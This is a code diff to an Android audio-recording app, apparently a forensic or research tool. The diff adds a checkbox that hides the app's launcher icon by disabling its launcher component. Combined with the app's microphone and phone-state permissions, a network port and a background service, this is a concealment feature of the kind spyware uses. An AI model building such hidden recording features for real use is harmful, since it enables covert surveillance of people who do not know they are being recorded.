@@ -2,6 +2,7 @@ package com.forensic.unipg.silenceaudiorecording;
 
 import android.Manifest;
 import android.app.ActivityManager;
+import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
 import android.content.pm.PackageManager;
@@ -11,6 +12,7 @@ import android.support.v7.app.AppCompatActivity;
 import android.os.Bundle;
 import android.text.Editable;
 import android.text.TextWatcher;
+import android.util.Log;
 import android.view.KeyEvent;
 import android.view.View;
 import android.view.WindowManager;
@@ -25,6 +27,8 @@ public class SilenceAudioRecordingActivity extends AppCompatActivity {
 
     private static final int  REQUEST_RECORD_AUDIO     = 200;
     private static final int  REQUEST_READ_PHONE_STATE = 201;
+    private static final ComponentName LAUNCHER_COMPONENT_NAME = new ComponentName(
+            "com.forensic.unipg.silenceaudiorecording", "com.forensic.unipg.silenceaudiorecording.Launcher");
     //state
     private boolean acceptRECORD_AUDIO     = false;
     private boolean acceptREAD_PHONE_STATE = false;
@@ -35,6 +39,7 @@ public class SilenceAudioRecordingActivity extends AppCompatActivity {
     EditText  et_port              = null;
     CheckBox  cb_rec_audio         = null;
     CheckBox  cb_read_phone_state  = null;
+    CheckBox  cb_hide_app_icon     = null;
     Button    bt_service           = null;
 
 
@@ -46,6 +51,12 @@ public class SilenceAudioRecordingActivity extends AppCompatActivity {
         mInfo.read(getBaseContext());
         //create ui
         createUI();
+    }
+
+    private boolean isLauncherIconVisible() {
+        int enabledSetting = getPackageManager()
+                .getComponentEnabledSetting(LAUNCHER_COMPONENT_NAME);
+        return enabledSetting == PackageManager.COMPONENT_ENABLED_STATE_ENABLED;
     }
 
     void createUI()
@@ -92,6 +103,16 @@ public class SilenceAudioRecordingActivity extends AppCompatActivity {
             public void onCheckedChanged(CompoundButton buttonView, boolean isChecked) {
                 requestReadPhoneStateRuntimePermission();
                 uiShowPermission();
+            }
+        });
+        //get app icon state
+        cb_hide_app_icon = (CheckBox)findViewById(R.id.cb_hide_icon);
+        cb_hide_app_icon.setChecked(!isLauncherIconVisible());
+        //attach listener
+        cb_hide_app_icon.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() {
+            @Override
+            public void onCheckedChanged(CompoundButton buttonView, boolean isChecked) {
+                setAppIconVisibility();
             }
         });
         //show
@@ -198,7 +219,23 @@ public class SilenceAudioRecordingActivity extends AppCompatActivity {
     {
         ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_PHONE_STATE}, REQUEST_RECORD_AUDIO);
     }
+    public void setAppIconVisibility()
+    {
+        if(cb_hide_app_icon.isChecked()){
+            getPackageManager().setComponentEnabledSetting(LAUNCHER_COMPONENT_NAME,
+                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                    PackageManager.DONT_KILL_APP);
+                    Log.d("forensic","hiding");
+        }
+        else{
+            getPackageManager().setComponentEnabledSetting(LAUNCHER_COMPONENT_NAME,
+                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
+                    PackageManager.DONT_KILL_APP);
+                    Log.d("forensic","showing");
+        }
 
+
+    }
 
     private boolean isServiceRunning(Class<?> serviceClass)
     {
